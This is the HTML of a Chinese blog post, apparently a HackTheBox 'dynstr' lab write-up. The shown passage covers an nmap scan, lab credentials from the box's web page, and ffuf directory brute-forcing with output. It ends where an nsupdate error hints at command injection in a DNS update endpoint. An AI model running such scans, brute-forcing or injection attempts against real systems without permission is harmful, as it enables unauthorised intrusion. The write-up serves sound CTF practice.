@@ -1,0 +1,1118 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/icon/apple-touch-icon.png">
+  <link rel="icon" href="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/icon/favicon.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="何语灵">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="每周练手">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox - dynstr">
+<meta property="og:url" content="https://m0ck1ng-b1rd.github.io/2021/12/07/HTB/dynstr/index.html">
+<meta property="og:site_name" content="M0cK1nG-b1Rd&#39;s site">
+<meta property="og:description" content="每周练手">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/images_modified/351a3dc43bf6d17690d56be707dc1725.png">
+<meta property="article:published_time" content="2021-12-07T05:01:01.000Z">
+<meta property="article:modified_time" content="2022-04-14T10:57:15.126Z">
+<meta property="article:author" content="何语灵">
+<meta property="article:tag" content="HackTheBox">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/images_modified/351a3dc43bf6d17690d56be707dc1725.png">
+  
+  
+  
+  <title>HackTheBox - dynstr - M0cK1nG-b1Rd&#39;s site</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/scroll.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"m0ck1ng-b1rd.github.io","root":"/","version":"1.9.0","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"87rdYWc7BpvmNHtufVgH6hwF-gzGzoHsz","app_key":"FOGIb6hlzKdTWSp4wBpACnWG","server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+
+  
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>M0cK1nG-b1Rd&#39;s site</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/761607.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="HackTheBox - dynstr"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2021-12-07 13:01" pubdate>
+          2021年12月7日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          9k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          75 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar category-bar" style="margin-right: -1rem">
+    
+
+
+
+
+
+<div class="category-list">
+  
+  
+    
+    
+    
+    <div class="category row nomargin-x">
+      <a class="category-item 
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="HackTheBox"
+        id="heading-d9fb08be3ed131369df5d4aa808dac70" role="tab" data-toggle="collapse" href="#collapse-d9fb08be3ed131369df5d4aa808dac70"
+        aria-expanded="true"
+      >
+        HackTheBox
+        <span class="list-group-count">(16)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse show" id="collapse-d9fb08be3ed131369df5d4aa808dac70"
+           role="tabpanel" aria-labelledby="heading-d9fb08be3ed131369df5d4aa808dac70">
+        
+        
+          
+  <div class="category-post-list">
+    
+    
+      
+      
+        <a href="/2021/12/07/HTB/BountyHunter/" title="HackTheBox - BountyHunter"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - BountyHunter</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/07/HTB/Cap/" title="HackTheBox - Cap"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - Cap</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/07/HTB/Driver/" title="HackTheBox - Driver"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - Driver</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/07/HTB/Horizontall/" title="HackTheBox - Horizontall"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - Horizontall</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/07/HTB/Intelligence/" title="HackTheBox - Intelligence"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - Intelligence</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/07/HTB/Monitors/" title="HackTheBox - Monitors"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - Monitors</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/07/HTB/Previse/" title="HackTheBox - Previse"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - Previse</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/07/HTB/Schooled/" title="HackTheBox - Schooled"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - Schooled</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/13/HTB/Seal/" title="HackTheBox - Seal"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - Seal</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2022/04/13/HTB/Shibboleth/" title="HackTheBox - Shibboleth"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - Shibboleth</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/07/HTB/Sink/" title="HackTheBox - Sink"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - Sink</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/07/HTB/Spider/" title="HackTheBox - Spider"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - Spider</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/07/HTB/StartingPoint-Archetype/" title="HackTheBox - StartingPoint-Archetype"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - StartingPoint-Archetype</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/07/HTB/StartingPoint-Pathfinder/" title="HackTheBox - StartingPoint-Pathfinder"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - StartingPoint-Pathfinder</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2022/05/19/HTB/Unicode/" title="HackTheBox - StartingPoint-Pathfinder"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - StartingPoint-Pathfinder</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/07/HTB/dynstr/" title="HackTheBox - dynstr"
+           class="list-group-item list-group-item-action
+           active">
+          <span class="category-post">HackTheBox - dynstr</span>
+        </a>
+      
+    
+  </div>
+
+        
+      </div>
+    </div>
+  
+</div>
+
+
+  </aside>
+
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">HackTheBox - dynstr</h1>
+            
+              <p class="note note-info">
+                
+                  
+                    本文最后更新于：2022年4月14日 晚上
+                  
+                
+              </p>
+            
+            <div class="markdown-body">
+              
+              <h1 id="0x01-端口探测"><a href="#0x01-端口探测" class="headerlink" title="0x01 端口探测"></a>0x01 端口探测</h1><p>使用nmap对靶机端口进行探测：</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nmap</span> -sV -sC <span class="hljs-number">10.10.10.244</span><br></code></pre></td></tr></table></figure>
+
+<p>结果如下，除了传统的22和80端口外，还有一个不同寻常的53端口：</p>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">Starting</span> <span class="hljs-selector-tag">Nmap</span> <span class="hljs-number">7.91</span> ( <span class="hljs-attribute">https</span>:<span class="hljs-comment">//nmap.org ) at 2021-10-08 21:57 CST</span><br>Nmap scan report for <span class="hljs-number">10.10</span>.<span class="hljs-number">10.244</span><br>Host is up (<span class="hljs-number">0.56s</span> latency).<br>Not <span class="hljs-attribute">shown</span>: <span class="hljs-number">997</span> closed ports<br>PORT   STATE SERVICE VERSION<br><span class="hljs-number">22</span>/tcp open  ssh     OpenSSH <span class="hljs-number">8.2</span>p1 Ubuntu <span class="hljs-number">4</span>ubuntu0.<span class="hljs-number">2</span> (Ubuntu Linux; protocol <span class="hljs-number">2.0</span>)<br>| <span class="hljs-attribute">ssh-hostkey</span>: <br>|   <span class="hljs-number">3072</span> <span class="hljs-number">05</span>:<span class="hljs-number">7</span><span class="hljs-attribute">c</span>:<span class="hljs-number">5</span><span class="hljs-attribute">e</span>:<span class="hljs-attribute">b1</span>:<span class="hljs-number">83</span>:<span class="hljs-attribute">f9</span>:<span class="hljs-number">4</span><span class="hljs-attribute">f</span>:<span class="hljs-attribute">ae</span>:<span class="hljs-number">2</span><span class="hljs-attribute">f</span>:<span class="hljs-number">08</span>:<span class="hljs-attribute">e1</span>:<span class="hljs-number">33</span>:<span class="hljs-attribute">ff</span>:<span class="hljs-attribute">f5</span>:<span class="hljs-number">83</span>:<span class="hljs-number">9</span>e (RSA)<br>|   <span class="hljs-number">256</span> <span class="hljs-number">3</span><span class="hljs-attribute">f</span>:<span class="hljs-number">73</span>:<span class="hljs-attribute">b4</span>:<span class="hljs-number">95</span>:<span class="hljs-number">72</span>:<span class="hljs-attribute">ca</span>:<span class="hljs-number">5</span><span class="hljs-attribute">e</span>:<span class="hljs-number">33</span>:<span class="hljs-attribute">f6</span>:<span class="hljs-number">8</span><span class="hljs-attribute">a</span>:<span class="hljs-number">8</span><span class="hljs-attribute">f</span>:<span class="hljs-number">46</span>:<span class="hljs-attribute">cf</span>:<span class="hljs-number">43</span>:<span class="hljs-number">35</span>:b9 (ECDSA)<br>|_  <span class="hljs-number">256</span> <span class="hljs-attribute">cc</span>:<span class="hljs-number">0</span><span class="hljs-attribute">a</span>:<span class="hljs-number">41</span>:<span class="hljs-attribute">b7</span>:<span class="hljs-attribute">a1</span>:<span class="hljs-number">9</span><span class="hljs-attribute">a</span>:<span class="hljs-number">43</span>:<span class="hljs-attribute">da</span>:<span class="hljs-number">1</span><span class="hljs-attribute">b</span>:<span class="hljs-number">68</span>:<span class="hljs-attribute">f5</span>:<span class="hljs-number">2</span><span class="hljs-attribute">a</span>:<span class="hljs-attribute">f8</span>:<span class="hljs-number">2</span><span class="hljs-attribute">a</span>:<span class="hljs-number">75</span>:<span class="hljs-number">2</span>c (ED25519)<br><span class="hljs-number">53</span>/tcp open  domain  ISC BIND <span class="hljs-number">9.16</span>.<span class="hljs-number">1</span> (Ubuntu Linux)<br>| <span class="hljs-attribute">dns-nsid</span>: <br>|_  bind.<span class="hljs-attribute">version</span>: <span class="hljs-number">9.16</span>.<span class="hljs-number">1</span>-Ubuntu<br><span class="hljs-number">80</span>/tcp open  http    Apache httpd <span class="hljs-number">2.4</span>.<span class="hljs-number">41</span> ((Ubuntu))<br>|<span class="hljs-attribute">_http-server-header</span>: Apache/<span class="hljs-number">2.4</span>.<span class="hljs-number">41</span> (Ubuntu)<br>|<span class="hljs-attribute">_http-title</span>: Dyna DNS<br>Service <span class="hljs-attribute">Info</span>: <span class="hljs-attribute">OS</span>: Linux; <span class="hljs-attribute">CPE</span>: <span class="hljs-attribute">cpe</span>:/<span class="hljs-attribute">o</span>:<span class="hljs-attribute">linux</span>:linux_kernel<br><br>Service detection performed. Please report any incorrect results at <span class="hljs-attribute">https</span>:<span class="hljs-comment">//nmap.org/submit/ .</span><br>Nmap <span class="hljs-attribute">done</span>: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned in <span class="hljs-number">27.00</span> seconds<br></code></pre></td></tr></table></figure>
+
+
+
+<h1 id="0x02-Web-Shell"><a href="#0x02-Web-Shell" class="headerlink" title="0x02 Web Shell"></a>0x02 Web Shell</h1><p>访问WEB界面，可以发现有域名和账户信息：</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/dynstr.assets/image-20211008220142704.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211008220142704"></p>
+<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">Username:</span> dynadns<br><span class="hljs-symbol">Password:</span> sndanyd<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">dnsalias<span class="hljs-selector-class">.htb</span><br>dynamicdns<span class="hljs-selector-class">.htb</span><br>no-ip.htb<br></code></pre></td></tr></table></figure>
+
+
+
+<p>搜了一圈没有发现有用信息，遂对目录进行扫描：</p>
+<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs livescript">╭─root@kali ~/Tools/SecLists/Discovery/Web-Content ‹master› <br>╰─<span class="hljs-comment"># ffuf -u http://dynamicdns.htb/FUZZ -w raft-large-directories-lowercase.txt -x http://localhost:8080</span><br><br>        <span class="hljs-regexp">/&#x27;___\  /</span><span class="hljs-string">&#x27;___\           /&#x27;</span>___<span class="hljs-string">\</span>       <br>       <span class="hljs-regexp">/\ \__/</span> <span class="hljs-regexp">/\ \__/</span>  __  __  <span class="hljs-regexp">/\ \__/</span>       <br>       <span class="hljs-string">\</span> <span class="hljs-string">\</span> ,__<span class="hljs-string">\\</span> <span class="hljs-string">\</span> ,__<span class="hljs-string">\/\</span> <span class="hljs-string">\/\</span> <span class="hljs-string">\</span> <span class="hljs-string">\</span> <span class="hljs-string">\</span> ,__<span class="hljs-string">\</span>      <br>        <span class="hljs-string">\</span> <span class="hljs-string">\</span> <span class="hljs-string">\_/</span> <span class="hljs-string">\</span> <span class="hljs-string">\</span> <span class="hljs-string">\_/\</span> <span class="hljs-string">\</span> <span class="hljs-string">\_\</span> <span class="hljs-string">\</span> <span class="hljs-string">\</span> <span class="hljs-string">\</span> <span class="hljs-string">\_/</span>      <br>         <span class="hljs-string">\</span> <span class="hljs-string">\_\</span>   <span class="hljs-string">\</span> <span class="hljs-string">\_\</span>  <span class="hljs-string">\</span> <span class="hljs-string">\____/</span>  <span class="hljs-string">\</span> <span class="hljs-string">\_\</span>       <br>          <span class="hljs-string">\/_/</span>    <span class="hljs-string">\/_/</span>   <span class="hljs-string">\/___/</span>    <span class="hljs-string">\/_/</span>       <br><br>       v1.<span class="hljs-number">3.1</span>-dev<br>________________________________________________<br><br> :: Method           : GET<br> :: URL              : http:<span class="hljs-regexp">//dynamicdns.htb/FUZZ</span><br><span class="hljs-regexp"> :: Wordlist         : FUZZ: raft-large-directories-lowercase.txt</span><br><span class="hljs-regexp"> :: Follow redirects : false</span><br><span class="hljs-regexp"> :: Calibration      : false</span><br><span class="hljs-regexp"> :: Proxy            : http://</span>localhost:<span class="hljs-number">8080</span><br> :: Timeout          : <span class="hljs-number">10</span><br> :: Threads          : <span class="hljs-number">40</span><br> :: Matcher          : Response status: <span class="hljs-number">200</span>,<span class="hljs-number">204</span>,<span class="hljs-number">301</span>,<span class="hljs-number">302</span>,<span class="hljs-number">307</span>,<span class="hljs-number">401</span>,<span class="hljs-number">403</span>,<span class="hljs-number">405</span><br>________________________________________________<br><br>assets                  [Status: <span class="hljs-number">301</span>, Size: <span class="hljs-number">317</span>, Words: <span class="hljs-number">20</span>, Lines: <span class="hljs-number">10</span>, Duration: <span class="hljs-number">1412ms</span>]<br>server-status           [Status: <span class="hljs-number">403</span>, Size: <span class="hljs-number">279</span>, Words: <span class="hljs-number">20</span>, Lines: <span class="hljs-number">10</span>, Duration: <span class="hljs-number">458ms</span>]<br>                        [Status: <span class="hljs-number">200</span>, Size: <span class="hljs-number">10909</span>, Words: <span class="hljs-number">1937</span>, Lines: <span class="hljs-number">282</span>, Duration: <span class="hljs-number">521ms</span>]<br>nic                     [Status: <span class="hljs-number">301</span>, Size: <span class="hljs-number">314</span>, Words: <span class="hljs-number">20</span>, Lines: <span class="hljs-number">10</span>, Duration: <span class="hljs-number">518ms</span>]<br>                        [Status: <span class="hljs-number">200</span>, Size: <span class="hljs-number">10909</span>, Words: <span class="hljs-number">1937</span>, Lines: <span class="hljs-number">282</span>, Duration: <span class="hljs-number">546ms</span>]<br>:: Progress: [<span class="hljs-number">56163</span>/<span class="hljs-number">56163</span>] :: Job [<span class="hljs-number">1</span>/<span class="hljs-number">1</span>] :: <span class="hljs-number">50</span> req/sec :: Duration: [<span class="hljs-number">0</span>:<span class="hljs-number">12</span>:<span class="hljs-number">45</span>] :: Errors: <span class="hljs-number">2</span> ::<br></code></pre></td></tr></table></figure>
+
+
+
+<p>发现了nic目录，继续对二级目录进行爆破：</p>
+<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs livescript">╭─root@kali ~/Tools/SecLists/Discovery/Web-Content ‹master› <br>╰─<span class="hljs-comment"># ffuf -u http://no-ip.htb/nic/FUZZ -w raft-large-directories-lowercase.txt -x http://localhost:8080 </span><br><br>        <span class="hljs-regexp">/&#x27;___\  /</span><span class="hljs-string">&#x27;___\           /&#x27;</span>___<span class="hljs-string">\</span>       <br>       <span class="hljs-regexp">/\ \__/</span> <span class="hljs-regexp">/\ \__/</span>  __  __  <span class="hljs-regexp">/\ \__/</span>       <br>       <span class="hljs-string">\</span> <span class="hljs-string">\</span> ,__<span class="hljs-string">\\</span> <span class="hljs-string">\</span> ,__<span class="hljs-string">\/\</span> <span class="hljs-string">\/\</span> <span class="hljs-string">\</span> <span class="hljs-string">\</span> <span class="hljs-string">\</span> ,__<span class="hljs-string">\</span>      <br>        <span class="hljs-string">\</span> <span class="hljs-string">\</span> <span class="hljs-string">\_/</span> <span class="hljs-string">\</span> <span class="hljs-string">\</span> <span class="hljs-string">\_/\</span> <span class="hljs-string">\</span> <span class="hljs-string">\_\</span> <span class="hljs-string">\</span> <span class="hljs-string">\</span> <span class="hljs-string">\</span> <span class="hljs-string">\_/</span>      <br>         <span class="hljs-string">\</span> <span class="hljs-string">\_\</span>   <span class="hljs-string">\</span> <span class="hljs-string">\_\</span>  <span class="hljs-string">\</span> <span class="hljs-string">\____/</span>  <span class="hljs-string">\</span> <span class="hljs-string">\_\</span>       <br>          <span class="hljs-string">\/_/</span>    <span class="hljs-string">\/_/</span>   <span class="hljs-string">\/___/</span>    <span class="hljs-string">\/_/</span>       <br><br>       v1.<span class="hljs-number">3.1</span>-dev<br>________________________________________________<br><br> :: Method           : GET<br> :: URL              : http:<span class="hljs-regexp">//no-ip.htb/nic/FUZZ</span><br><span class="hljs-regexp"> :: Wordlist         : FUZZ: raft-large-directories-lowercase.txt</span><br><span class="hljs-regexp"> :: Follow redirects : false</span><br><span class="hljs-regexp"> :: Calibration      : false</span><br><span class="hljs-regexp"> :: Proxy            : http://</span>localhost:<span class="hljs-number">8080</span><br> :: Timeout          : <span class="hljs-number">10</span><br> :: Threads          : <span class="hljs-number">40</span><br> :: Matcher          : Response status: <span class="hljs-number">200</span>,<span class="hljs-number">204</span>,<span class="hljs-number">301</span>,<span class="hljs-number">302</span>,<span class="hljs-number">307</span>,<span class="hljs-number">401</span>,<span class="hljs-number">403</span>,<span class="hljs-number">405</span><br>________________________________________________<br><br>update                  [Status: <span class="hljs-number">200</span>, Size: <span class="hljs-number">8</span>, Words: <span class="hljs-number">1</span>, Lines: <span class="hljs-number">2</span>, Duration: <span class="hljs-number">465ms</span>]<br>                        [Status: <span class="hljs-number">200</span>, Size: <span class="hljs-number">0</span>, Words: <span class="hljs-number">1</span>, Lines: <span class="hljs-number">1</span>, Duration: <span class="hljs-number">502ms</span>]<br>                        [Status: <span class="hljs-number">200</span>, Size: <span class="hljs-number">0</span>, Words: <span class="hljs-number">1</span>, Lines: <span class="hljs-number">1</span>, Duration: <span class="hljs-number">599ms</span>]<br>:: Progress: [<span class="hljs-number">56163</span>/<span class="hljs-number">56163</span>] :: Job [<span class="hljs-number">1</span>/<span class="hljs-number">1</span>] :: <span class="hljs-number">57</span> req/sec :: Duration: [<span class="hljs-number">0</span>:<span class="hljs-number">15</span>:<span class="hljs-number">28</span>] :: Errors: <span class="hljs-number">2</span> ::<br></code></pre></td></tr></table></figure>
+
+
+
+<p>题外话：在复盘的时候发现在no-ip.com能直接发现相关的接口，也就是其实是不用爆破的。。。</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/dynstr.assets/image-20211019195943707.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211019195943707"></p>
+<p>直接访问该链接，结果如下：</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/dynstr.assets/image-20211019191835400.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211019191835400"></p>
+<p>Google一下能够发现该接口使用的验证信息：</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/dynstr.assets/image-20211009120205933.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211009120205933"></p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/dynstr.assets/image-20211019191913980.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211019191913980"></p>
+<p>遂构造数据包，成功发送请求：</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/dynstr.assets/image-20211009121036542.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211009121036542"></p>
+<p>尝试输入一些特殊字符，得到报错。发现使用了nsupdate。</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/dynstr.assets/image-20211009121329235.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20211009121329235"></p>
+<p>查看nsupdate，发现是linux中的二进制文件。</p>
